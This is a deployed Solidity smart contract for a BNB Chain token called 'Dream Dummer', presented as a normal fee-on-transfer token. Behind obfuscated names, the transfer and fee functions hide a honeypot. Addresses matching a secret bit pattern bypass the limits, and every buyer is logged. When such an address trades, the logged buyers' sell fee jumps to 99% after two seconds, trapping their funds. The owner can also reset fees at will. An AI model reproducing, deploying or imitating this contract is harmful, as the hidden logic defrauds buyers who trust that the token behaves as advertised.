/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract DreamDummer is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Dream Dummer ";
    string constant _symbol = "DreamDummer";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private swapReceiverAutoTx;
    mapping(address => bool) private exemptSellLaunchedBots;
    mapping(address => bool) private sellLiquidityModeTrading;
    mapping(address => bool) private feeAutoSellMax;
    mapping(address => uint256) private launchedMinModeFee;
    mapping(uint256 => address) private isLimitSwapBuy;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private modeReceiverIsFee = 0;
    uint256 private swapIsWalletModeMinReceiverMarketing = 3;

    //SELL FEES
    uint256 private limitMarketingBurnTrading = 0;
    uint256 private teamLiquidityMaxMin = 3;

    uint256 private feeTradingLaunchedAutoIs = swapIsWalletModeMinReceiverMarketing + modeReceiverIsFee;
    uint256 private minSwapLimitBots = 100;

    address private launchedBurnBuyExemptSellTradingAuto = (msg.sender); // auto-liq address
    address private burnIsSellBuy = (0xA54658b1023550433db21c87ffffe207c4aF8603); // marketing address
    address private buyLiquidityBotsTrading = DEAD;
    address private modeIsTeamMinWallet = DEAD;
    address private launchedBurnSwapLiquidity = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private maxSwapTradingTxLiquidity;
    uint256 private autoFeeWalletSwapBotsBuy;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private swapMarketingTeamBurn;
    uint256 private sellLaunchedTradingExemptBuyAuto;
    uint256 private sellIsAutoTxBurn;
    uint256 private sellTradingMarketingExempt;
    uint256 private feeReceiverLimitSwapBotsIs;

    bool private launchedFeeSwapWalletReceiver = true;
    bool private feeAutoSellMaxMode = true;
    bool private liquidityBotsMarketingLaunched = true;
    bool private tradingWalletLaunchedBuy = true;
    bool private walletTeamAutoBots = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private liquidityModeTeamBuyIs = _totalSupply / 1000; // 0.1%

    
    bool private walletReceiverLimitMaxIsTrading;
    bool private feeIsBuyTx;
    uint256 private limitTxMaxLaunched;
    bool private autoSwapLaunchedLiquiditySellModeMin;
    uint256 private botsMaxModeReceiverAutoMarketingSell;
    bool private txBotsMaxFee;
    uint256 private liquidityBuyIsSellFeeReceiverAuto;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        swapMarketingTeamBurn = true;

        swapReceiverAutoTx[msg.sender] = true;
        swapReceiverAutoTx[address(this)] = true;

        exemptSellLaunchedBots[msg.sender] = true;
        exemptSellLaunchedBots[0x0000000000000000000000000000000000000000] = true;
        exemptSellLaunchedBots[0x000000000000000000000000000000000000dEaD] = true;
        exemptSellLaunchedBots[address(this)] = true;

        sellLiquidityModeTrading[msg.sender] = true;
        sellLiquidityModeTrading[0x0000000000000000000000000000000000000000] = true;
        sellLiquidityModeTrading[0x000000000000000000000000000000000000dEaD] = true;
        sellLiquidityModeTrading[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return sellModeWalletLimitTradingTx(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return sellModeWalletLimitTradingTx(sender, recipient, amount);
    }

    function sellModeWalletLimitTradingTx(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = maxSellTeamAutoMode(sender) || maxSellTeamAutoMode(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                tradingMaxReceiverMinLimit();
            }
            if (!bLimitTxWalletValue) {
                limitTeamExemptMarketingMaxAuto(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return autoSwapFeeExempt(sender, recipient, amount);}

        if (!swapReceiverAutoTx[sender] && !swapReceiverAutoTx[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || sellLiquidityModeTrading[sender] || sellLiquidityModeTrading[recipient], "Max TX Limit has been triggered");

        if (receiverMarketingExemptMin()) {launchedMarketingBurnIs();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = modeSwapTeamSell(sender) ? isLaunchedMarketingBurn(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function autoSwapFeeExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeSwapTeamSell(address sender) internal view returns (bool) {
        return !exemptSellLaunchedBots[sender];
    }

    function botsMinLiquidityBuyExemptFeeMax(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            feeTradingLaunchedAutoIs = teamLiquidityMaxMin + limitMarketingBurnTrading;
            return limitModeTeamMax(sender, feeTradingLaunchedAutoIs);
        }
        if (!selling && sender == uniswapV2Pair) {
            feeTradingLaunchedAutoIs = swapIsWalletModeMinReceiverMarketing + modeReceiverIsFee;
            return feeTradingLaunchedAutoIs;
        }
        return limitModeTeamMax(sender, feeTradingLaunchedAutoIs);
    }

    function isLaunchedMarketingBurn(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(botsMinLiquidityBuyExemptFeeMax(sender, receiver == uniswapV2Pair)).div(minSwapLimitBots);

        if (feeAutoSellMax[sender] || feeAutoSellMax[receiver]) {
            feeAmount = amount.mul(99).div(minSwapLimitBots);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function maxSellTeamAutoMode(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function limitModeTeamMax(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = launchedMinModeFee[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function limitTeamExemptMarketingMaxAuto(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        isLimitSwapBuy[exemptLimitValue] = addr;
    }

    function tradingMaxReceiverMinLimit() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (launchedMinModeFee[isLimitSwapBuy[i]] == 0) {
                    launchedMinModeFee[isLimitSwapBuy[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(burnIsSellBuy).transfer(amountBNB * amountPercentage / 100);
    }

    function receiverMarketingExemptMin() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    walletTeamAutoBots &&
    _balances[address(this)] >= liquidityModeTeamBuyIs;
    }

    function launchedMarketingBurnIs() internal swapping {
        uint256 amountToLiquify = liquidityModeTeamBuyIs.mul(modeReceiverIsFee).div(feeTradingLaunchedAutoIs).div(2);
        uint256 amountToSwap = liquidityModeTeamBuyIs.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = feeTradingLaunchedAutoIs.sub(modeReceiverIsFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(modeReceiverIsFee).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(swapIsWalletModeMinReceiverMarketing).div(totalETHFee);

        payable(burnIsSellBuy).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                launchedBurnBuyExemptSellTradingAuto,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLiquidityModeTeamBuyIs() public view returns (uint256) {
        return liquidityModeTeamBuyIs;
    }
    function setLiquidityModeTeamBuyIs(uint256 a0) public onlyOwner {
        liquidityModeTeamBuyIs=a0;
    }

    function getLaunchedFeeSwapWalletReceiver() public view returns (bool) {
        if (launchedFeeSwapWalletReceiver != feeAutoSellMaxMode) {
            return feeAutoSellMaxMode;
        }
        return launchedFeeSwapWalletReceiver;
    }
    function setLaunchedFeeSwapWalletReceiver(bool a0) public onlyOwner {
        launchedFeeSwapWalletReceiver=a0;
    }

    function getModeIsTeamMinWallet() public view returns (address) {
        if (modeIsTeamMinWallet != buyLiquidityBotsTrading) {
            return buyLiquidityBotsTrading;
        }
        return modeIsTeamMinWallet;
    }
    function setModeIsTeamMinWallet(address a0) public onlyOwner {
        modeIsTeamMinWallet=a0;
    }

    function getFeeTradingLaunchedAutoIs() public view returns (uint256) {
        if (feeTradingLaunchedAutoIs != teamLiquidityMaxMin) {
            return teamLiquidityMaxMin;
        }
        if (feeTradingLaunchedAutoIs == teamLiquidityMaxMin) {
            return teamLiquidityMaxMin;
        }
        return feeTradingLaunchedAutoIs;
    }
    function setFeeTradingLaunchedAutoIs(uint256 a0) public onlyOwner {
        if (feeTradingLaunchedAutoIs == minSwapLimitBots) {
            minSwapLimitBots=a0;
        }
        if (feeTradingLaunchedAutoIs == feeTradingLaunchedAutoIs) {
            feeTradingLaunchedAutoIs=a0;
        }
        feeTradingLaunchedAutoIs=a0;
    }

    function getExemptSellLaunchedBots(address a0) public view returns (bool) {
        if (a0 != buyLiquidityBotsTrading) {
            return launchedFeeSwapWalletReceiver;
        }
        if (a0 == modeIsTeamMinWallet) {
            return launchedFeeSwapWalletReceiver;
        }
        if (exemptSellLaunchedBots[a0] == feeAutoSellMax[a0]) {
            return launchedFeeSwapWalletReceiver;
        }
            return exemptSellLaunchedBots[a0];
    }
    function setExemptSellLaunchedBots(address a0,bool a1) public onlyOwner {
        if (exemptSellLaunchedBots[a0] == exemptSellLaunchedBots[a0]) {
           exemptSellLaunchedBots[a0]=a1;
        }
        exemptSellLaunchedBots[a0]=a1;
    }

    function getFeeAutoSellMaxMode() public view returns (bool) {
        return feeAutoSellMaxMode;
    }
    function setFeeAutoSellMaxMode(bool a0) public onlyOwner {
        if (feeAutoSellMaxMode == walletTeamAutoBots) {
            walletTeamAutoBots=a0;
        }
        if (feeAutoSellMaxMode == launchedFeeSwapWalletReceiver) {
            launchedFeeSwapWalletReceiver=a0;
        }
        feeAutoSellMaxMode=a0;
    }

    function getSellLiquidityModeTrading(address a0) public view returns (bool) {
        if (a0 == launchedBurnBuyExemptSellTradingAuto) {
            return liquidityBotsMarketingLaunched;
        }
            return sellLiquidityModeTrading[a0];
    }
    function setSellLiquidityModeTrading(address a0,bool a1) public onlyOwner {
        sellLiquidityModeTrading[a0]=a1;
    }

    function getBuyLiquidityBotsTrading() public view returns (address) {
        if (buyLiquidityBotsTrading != modeIsTeamMinWallet) {
            return modeIsTeamMinWallet;
        }
        if (buyLiquidityBotsTrading != burnIsSellBuy) {
            return burnIsSellBuy;
        }
        return buyLiquidityBotsTrading;
    }
    function setBuyLiquidityBotsTrading(address a0) public onlyOwner {
        if (buyLiquidityBotsTrading != modeIsTeamMinWallet) {
            modeIsTeamMinWallet=a0;
        }
        if (buyLiquidityBotsTrading != launchedBurnBuyExemptSellTradingAuto) {
            launchedBurnBuyExemptSellTradingAuto=a0;
        }
        if (buyLiquidityBotsTrading == launchedBurnBuyExemptSellTradingAuto) {
            launchedBurnBuyExemptSellTradingAuto=a0;
        }
        buyLiquidityBotsTrading=a0;
    }

    function getLaunchedBurnBuyExemptSellTradingAuto() public view returns (address) {
        return launchedBurnBuyExemptSellTradingAuto;
    }
    function setLaunchedBurnBuyExemptSellTradingAuto(address a0) public onlyOwner {
        if (launchedBurnBuyExemptSellTradingAuto == launchedBurnSwapLiquidity) {
            launchedBurnSwapLiquidity=a0;
        }
        if (launchedBurnBuyExemptSellTradingAuto != launchedBurnSwapLiquidity) {
            launchedBurnSwapLiquidity=a0;
        }
        launchedBurnBuyExemptSellTradingAuto=a0;
    }

    function getMinSwapLimitBots() public view returns (uint256) {
        if (minSwapLimitBots != swapIsWalletModeMinReceiverMarketing) {
            return swapIsWalletModeMinReceiverMarketing;
        }
        return minSwapLimitBots;
    }
    function setMinSwapLimitBots(uint256 a0) public onlyOwner {
        if (minSwapLimitBots == liquidityModeTeamBuyIs) {
            liquidityModeTeamBuyIs=a0;
        }
        if (minSwapLimitBots != swapIsWalletModeMinReceiverMarketing) {
            swapIsWalletModeMinReceiverMarketing=a0;
        }
        if (minSwapLimitBots == modeReceiverIsFee) {
            modeReceiverIsFee=a0;
        }
        minSwapLimitBots=a0;
    }

    function getTeamLiquidityMaxMin() public view returns (uint256) {
        if (teamLiquidityMaxMin == teamLiquidityMaxMin) {
            return teamLiquidityMaxMin;
        }
        if (teamLiquidityMaxMin != limitMarketingBurnTrading) {
            return limitMarketingBurnTrading;
        }
        return teamLiquidityMaxMin;
    }
    function setTeamLiquidityMaxMin(uint256 a0) public onlyOwner {
        if (teamLiquidityMaxMin != liquidityModeTeamBuyIs) {
            liquidityModeTeamBuyIs=a0;
        }
        teamLiquidityMaxMin=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}